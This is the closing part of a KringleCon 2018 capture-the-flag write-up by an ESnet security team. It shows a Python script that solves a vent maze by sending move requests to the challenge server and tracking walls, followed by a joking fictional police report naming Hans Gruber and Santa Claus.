<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">move</span>(heading, x, y, f, action=<span style="color: #8b2252;">'forward'</span>, resourceid=<span style="color: #8b2252;">'inigomontoya'</span>):
        <span style="color: #a0522d;">key</span> = location_keys[(x, y, f)]
        <span style="color: #a020f0;">return</span> requests.post(<span style="color: #8b2252;">'https://vents.kringlecastle.com/move'</span>, data = {<span style="color: #8b2252;">'heading'</span>: heading, <span style="color: #8b2252;">'mazex'</span>: x, <span style="color: #8b2252;">'mazey'</span>: y, <span style="color: #8b2252;">'mazef'</span>: f, <span style="color: #8b2252;">'playeraction'</span>: action, <span style="color: #8b2252;">'locationkey'</span>: key,
<span style="color: #8b2252;">'resourceid'</span>: resourceid})

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(result):

    <span style="color: #b22222;"># </span><span style="color: #b22222;">default action</span>
    <span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"forward"</span>

    <span style="color: #b22222;">#    </span><span style="color: #b22222;">Check for a change in response size.</span>
    <span style="color: #b22222;">#    </span><span style="color: #b22222;">We did this (with some other code adjustments) to fully explore every vent space</span>
    <span style="color: #b22222;">#    </span><span style="color: #b22222;">and verify there weren't any other secrets.</span>
    <span style="color: #b22222;">#    </span><span style="color: #b22222;">if(len(result.text) &gt; 3514) or len(result.text) &lt; 3509:</span>
    <span style="color: #b22222;">#        </span><span style="color: #b22222;">print("Length: ",len(result.text))</span>

    <span style="color: #a020f0;">for</span> line <span style="color: #a020f0;">in</span> result.text.split(<span style="color: #8b2252;">'\n'</span>):
        <span style="color: #a020f0;">if</span>(re.search(r<span style="color: #8b2252;">'Congratulations'</span>,line)):
            <span style="color: #a020f0;">print</span>(result.text)
            <span style="color: #008b8b;">exit</span>(1)
        <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">' = '</span> <span style="color: #a020f0;">not</span> <span style="color: #a020f0;">in</span> line:
            <span style="color: #a020f0;">continue</span>
        <span style="color: #a0522d;">data</span>, <span style="color: #a0522d;">val</span> = line.split(<span style="color: #8b2252;">' = '</span>, 1)
        <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">'"'</span> <span style="color: #a020f0;">not</span> <span style="color: #a020f0;">in</span> val:
            <span style="color: #a020f0;">continue</span>
        <span style="color: #a0522d;">value</span> = val.split(<span style="color: #8b2252;">'"'</span>)[1]

        <span style="color: #a020f0;">if</span>(re.search(r<span style="color: #8b2252;">'arrow\-up'</span>,data) <span style="color: #a020f0;">and</span> value==<span style="color: #8b2252;">"visible"</span>):
            <span style="color: #a0522d;">a</span>=<span style="color: #8b2252;">"up"</span>
            <span style="color: #a020f0;">continue</span>

        <span style="color: #a020f0;">if</span>(re.search(r<span style="color: #8b2252;">'arrow\-down'</span>,data) <span style="color: #a020f0;">and</span> value==<span style="color: #8b2252;">"visible"</span>):
            <span style="color: #a0522d;">a</span>=<span style="color: #8b2252;">"down"</span>
            <span style="color: #a020f0;">continue</span>

        <span style="color: #a0522d;">match</span> = re.search(r<span style="color: #8b2252;">'namedItem\(\"(\w+)\"\)'</span>,data)
        <span style="color: #a020f0;">if</span> match <span style="color: #a020f0;">is</span> <span style="color: #a020f0;">not</span> <span style="color: #008b8b;">None</span>:
            <span style="color: #a0522d;">key</span> = match.group(1)

            <span style="color: #a020f0;">if</span>(key == <span style="color: #8b2252;">"heading"</span>):
                <span style="color: #b22222;"># </span><span style="color: #b22222;">we already know our heading, we don't really need this.</span>
                <span style="color: #a0522d;">heading</span>=<span style="color: #483d8b;">str</span>(value)
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"mazex"</span>):
                <span style="color: #a0522d;">x</span> = <span style="color: #483d8b;">int</span>(value)
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"mazey"</span>):
                <span style="color: #a0522d;">y</span> = <span style="color: #483d8b;">int</span>(value)
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"mazef"</span>):
                <span style="color: #a0522d;">f</span> = <span style="color: #483d8b;">int</span>(value)
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"locationkey"</span>):
                <span style="color: #a0522d;">lk</span> = <span style="color: #483d8b;">str</span>(value)
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"resourceid"</span>):
                <span style="color: #a0522d;">rid</span> = <span style="color: #483d8b;">str</span>(value)
                <span style="color: #a020f0;">if</span>(rid != <span style="color: #8b2252;">"inigomontoya"</span>):
                    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"Resource ID changed?  %s"</span>,rid)
                    <span style="color: #008b8b;">exit</span>(1)
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"northwall"</span>):
                <span style="color: #a0522d;">n</span> = value == <span style="color: #8b2252;">"True"</span>
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"southwall"</span>):
                <span style="color: #a0522d;">s</span> = value == <span style="color: #8b2252;">"True"</span>
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"eastwall"</span>):
                <span style="color: #a0522d;">e</span> = value == <span style="color: #8b2252;">"True"</span>
            <span style="color: #a020f0;">elif</span>(key == <span style="color: #8b2252;">"westwall"</span>):
                <span style="color: #a0522d;">w</span> = value == <span style="color: #8b2252;">"True"</span>
            <span style="color: #a020f0;">else</span>:
                <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"Unknown namedItem: %s"</span>,key)
                <span style="color: #b22222;"># </span><span style="color: #b22222;">yeah yeah... we could throw an exception instead</span>
                <span style="color: #008b8b;">exit</span>(1)

    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">location_keys</span>[(x, y, f)] = lk
    <span style="color: #a020f0;">except</span>:
        <span style="color: #a020f0;">print</span>(result.text)

    <span style="color: #a020f0;">return</span> a, x, y, f, n, s, e, w

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">print_map</span>(x,y,f):

    <span style="color: #a020f0;">for</span> j <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1,20):
        <span style="color: #a020f0;">for</span> fl <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1,3):
            <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(1,24):
                <span style="color: #a020f0;">if</span>(x == i <span style="color: #a020f0;">and</span> y == j <span style="color: #a020f0;">and</span> f == fl):
                    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"X"</span>, end=<span style="color: #8b2252;">''</span>)
                <span style="color: #a020f0;">elif</span>((i,j,fl) <span style="color: #a020f0;">in</span> location_shafts):
                    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"%s"</span> % location_shafts[(i,j,fl)], end=<span style="color: #8b2252;">''</span>)
                <span style="color: #a020f0;">elif</span>((i,j,fl) <span style="color: #a020f0;">in</span> location_keys):
                    <span style="color: #a020f0;">print</span>(<span style="color: #483d8b;">chr</span>(9608), end=<span style="color: #8b2252;">''</span>)
                <span style="color: #a020f0;">else</span>:
                    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"."</span>, end=<span style="color: #8b2252;">''</span>)
            <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"    "</span>, end=<span style="color: #8b2252;">''</span>)
        <span style="color: #a020f0;">print</span>()


<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">determine_heading</span>(heading,n,w,s,e):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">hug the right wall</span>
    <span style="color: #a0522d;">walls</span> = [n,w,s,e]

    <span style="color: #b22222;"># </span><span style="color: #b22222;">The order we test in, wrapping as necessary.</span>
    <span style="color: #a0522d;">order</span> = [<span style="color: #8b2252;">'n'</span>,<span style="color: #8b2252;">'w'</span>,<span style="color: #8b2252;">'s'</span>,<span style="color: #8b2252;">'e'</span>]
    <span style="color: #a0522d;">directions</span> = {
        <span style="color: #8b2252;">'n'</span>: 0,
        <span style="color: #8b2252;">'w'</span>: 1,
        <span style="color: #8b2252;">'s'</span>: 2,
        <span style="color: #8b2252;">'e'</span>: 3
        }

    <span style="color: #a0522d;">cur</span> = directions[heading]

    <span style="color: #b22222;"># </span><span style="color: #b22222;">to start, look right</span>
    <span style="color: #a0522d;">cur</span> = (cur-1) % 4

    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(0,4):
        <span style="color: #a020f0;">if</span> walls[cur] == <span style="color: #008b8b;">False</span>:
            <span style="color: #a020f0;">return</span> order[cur]

        <span style="color: #b22222;"># </span><span style="color: #b22222;">check one turn to the left.</span>
        <span style="color: #a0522d;">cur</span> = (cur+1) % 4

    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"This should never happen, how did I get surrounded by walls?"</span>)
    <span style="color: #008b8b;">exit</span>(1)


<span style="color: #b22222;"># </span><span style="color: #b22222;">Starting position</span>
<span style="color: #a0522d;">x</span> = 23
<span style="color: #a0522d;">y</span> = 19
<span style="color: #a0522d;">f</span> = 1
<span style="color: #a0522d;">n</span>, <span style="color: #a0522d;">s</span>, <span style="color: #a0522d;">e</span>, <span style="color: #a0522d;">w</span> = <span style="color: #008b8b;">True</span>, <span style="color: #008b8b;">True</span>, <span style="color: #008b8b;">True</span>, <span style="color: #008b8b;">False</span>
<span style="color: #a0522d;">location_keys</span>[(23, 19, 1)] = <span style="color: #8b2252;">'ba49a09644aa8fa7fb0082e935f46521'</span>
<span style="color: #a0522d;">heading</span> = <span style="color: #8b2252;">"w"</span>
<span style="color: #a0522d;">action</span> = <span style="color: #8b2252;">"forward"</span>
<span style="color: #a0522d;">location_shafts</span>[(23,19,1)] = <span style="color: #8b2252;">"S"</span>

<span style="color: #a0522d;">i</span> = 0
<span style="color: #a020f0;">while</span>(<span style="color: #008b8b;">True</span>):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">determine move:</span>
    <span style="color: #a0522d;">heading</span> = determine_heading(heading,n,w,s,e)
    <span style="color: #a0522d;">result</span> = move(heading, x, y, f, action=action)
    <span style="color: #a0522d;">last_action</span> = action
    <span style="color: #a0522d;">action</span>, <span style="color: #a0522d;">x</span>, <span style="color: #a0522d;">y</span>, <span style="color: #a0522d;">f</span>, <span style="color: #a0522d;">n</span>, <span style="color: #a0522d;">s</span>, <span style="color: #a0522d;">e</span>, <span style="color: #a0522d;">w</span> = parse(result)

    <span style="color: #b22222;"># </span><span style="color: #b22222;">a little more useful symbols for the map</span>
    <span style="color: #a020f0;">if</span>(action == <span style="color: #8b2252;">"up"</span>):
        <span style="color: #a0522d;">location_shafts</span>[(x,y,f)] = <span style="color: #8b2252;">"U"</span>

        <span style="color: #b22222;"># </span><span style="color: #b22222;">TEMP  don't go up, keep exploring</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">action = "forward"</span>

    <span style="color: #a020f0;">if</span>(action == <span style="color: #8b2252;">"down"</span>):
        <span style="color: #a0522d;">location_shafts</span>[(x,y,f)] = <span style="color: #8b2252;">"D"</span>

        <span style="color: #b22222;"># </span><span style="color: #b22222;">TEMP  don't go down from 2F, keep exploring</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">action = "forward"</span>

    <span style="color: #b22222;"># </span><span style="color: #b22222;">don't get stuck going up and down in a loop</span>
    <span style="color: #a020f0;">if</span>(action == <span style="color: #8b2252;">"down"</span> <span style="color: #a020f0;">and</span> last_action==<span style="color: #8b2252;">"up"</span>):
        <span style="color: #a0522d;">action</span> = <span style="color: #8b2252;">"forward"</span>
    <span style="color: #a020f0;">elif</span>(action == <span style="color: #8b2252;">"up"</span> <span style="color: #a020f0;">and</span> last_action==<span style="color: #8b2252;">"down"</span>):
        <span style="color: #a0522d;">action</span> = <span style="color: #8b2252;">"forward"</span>

    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">"%i  %i,%i,%i   %s"</span> % (i, x, y, f,location_keys[(x,y,f)]))

    <span style="color: #b22222;"># </span><span style="color: #b22222;">We know this is the exit in this case.</span>
    <span style="color: #a020f0;">if</span>(action==<span style="color: #8b2252;">"down"</span>):
        print_map(x,y,f)

    <span style="color: #b22222;"># </span><span style="color: #b22222;">be nice</span>
    time.sleep(0.50)

    <span style="color: #b22222;"># </span><span style="color: #b22222;">Just helps keep track of what's going on visually.</span>
    <span style="color: #a0522d;">i</span> = i + 1
    <span style="color: #a020f0;">if</span>(i == 20):
        print_map(x, y, f)
        <span style="color: #a0522d;">i</span> = 0

print_map(x, y, f)
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org83825b8" class="outline-2">
<h2 id="report"><a id="org83825b8"></a>Postscript: Police Report</h2>
<div class="outline-text-2" id="text-report">
<blockquote>
<p>
<b>Case No</b>:  951-262-3062 
     (<i>Note to filing clerk: make sure to put this in the case number line, NOT the phone number</i>
     <i>line, this is also Santa Claus’ phone number and it’s easy to confuse</i>)
</p>

<p>
<b>Date</b>:    12/21/2018
</p>

<p>
<b>Reporting Officer</b>: Sgt. Al Powell        
</p>

<p>
<b>Prepared By</b>:    ESnet Security
</p>

<p>
<b>Incident</b>: 
On the day of the 18th, ESnet Security was told of hostages being taken at Kringlecon. 
</p>

<p>
<span class="underline">POLICE REPORT</span>
</p>

<p>
<b>Summary</b>: After speaking to Santa’s Elves, we were warned that all
was not as it seemed at Kringlecon. The Toy Soldiers appeared to be up
to something. We were able to ascertain many clues throughout the
castle using many different digital forensic techniques. These clues
pointed us to our belief that the Toy Soldiers were actually working
for Hans Gruber. Hans was in turn, working for none other than Santa
Claus himself. It seems Santa Claus had a feeling he could use some
investigative help at some point in the future, so he set up this test
to see if we were the people he should call on in the future.
</p>
</blockquote>


<div class="figure">
<p><img src="./imgs/police_hans.png" alt="police_hans.png" width="200px" />
</p>
<p><span class="figure-number">Figure 66: </span>Hans Gruber, person of interest</p>
</div>

<p>
<i>1988: Kidnapping, Murder, Attempted Grand Larceny - Took hostages at Nakatomi Plaza in an attempt to steal $640 million dollars in bearer bonds</i>
</p>


<div class="figure">
<p><img src="./imgs/police_santa.png" alt="police_santa.png" width="200px" />
</p>
<p><span class="figure-number">Figure 67: </span>Santa Claus, interesting person</p>
</div>

<p>
<i>~280 AD - 2018: Breaking and entering into homes around the world every winter. Estimates suggest 640 million per year (coincidentally the same amount Hans attempted to steal)</i>
</p>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: ESnet Security Team</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
